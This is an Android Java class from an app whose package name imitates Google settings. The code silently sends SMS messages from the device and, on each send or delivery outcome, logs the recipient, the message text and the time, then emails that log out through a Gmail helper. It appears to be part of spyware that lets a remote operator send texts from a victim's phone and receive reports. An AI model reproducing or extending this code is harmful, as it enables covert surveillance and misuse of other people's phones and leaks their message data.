package com.setting.dl.google.googlesettings.phone;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.telephony.SmsManager;

import com.setting.dl.google.googlesettings.mail.gmail.Mail;
import com.setting.dl.google.googlesettings.u;

import java.util.Date;

public class SendSms {
    
    private final static String fileSmsSend   = "smssend.txt";
    
    private String phoneNo;
    private String msg;
    private final Context context;
    
    public SendSms(Context context, String phoneNo, String msg) {
        
        this.context = context;
        this.phoneNo = phoneNo;
        this.msg = msg;
        send();
    }
    
    private void send() {
    
        String SENT = "SMS_SENT";
        
        PendingIntent sentPI = PendingIntent.getBroadcast(context, 0,
                new Intent(SENT), 0);
    
        String DELIVERED = "SMS_DELIVERED";
        PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0,
                new Intent(DELIVERED), 0);
    
        //---when the SMS has been sent---
        context.registerReceiver(new BroadcastReceiver(){
            @Override
            public void onReceive(Context arg0, Intent arg1) {
                switch (getResultCode())
                {
                    case Activity.RESULT_OK:
    
                        u.saveValue(context, fileSmsSend, u.s("Mesaj gönderildi\n%s\n%s\n%s\n",
                                                                u.getDate(new Date()), phoneNo, msg));
    
                        Mail.send(context, fileSmsSend);
                        
                        break;
                    
                    case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                    case SmsManager.RESULT_ERROR_NO_SERVICE:
                    case SmsManager.RESULT_ERROR_NULL_PDU:
                    case SmsManager.RESULT_ERROR_RADIO_OFF:
    
                        u.saveValue(context, fileSmsSend, u.s("Mesaj gönderilemedi\n%s\n%s\n%s\n",
                                                                u.getDate(new Date()), phoneNo, msg));
    
                        Mail.send(context, fileSmsSend);
                        break;
                }
            }
        }, new IntentFilter(SENT));
    
        //---when the SMS has been delivered---
        context.registerReceiver(new BroadcastReceiver(){
            @Override
            public void onReceive(Context arg0, Intent arg1) {
                
                switch (getResultCode())
                {
                    case Activity.RESULT_OK:
                        
                        u.saveValue(context, fileSmsSend, u.s("Mesaj iletildi\n%s\n%s\n%s\n",
                                                                u.getDate(new Date()), phoneNo, msg));
    
                        Mail.send(context, fileSmsSend);
                        
                        break;
                    
                    case Activity.RESULT_CANCELED:
    
                        u.saveValue(context, fileSmsSend, u.s("Mesaj iletilmedi\n%s\n%s\n%s\n",
                                                                u.getDate(new Date()), phoneNo, msg));
    
                        Mail.send(context, fileSmsSend);
                        break;
                }
            }
        }, new IntentFilter(DELIVERED));
    
    
        
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, msg, sentPI, deliveredPI);
            
        } catch (Exception ex) {
            
            ex.printStackTrace();
        }
    }
}
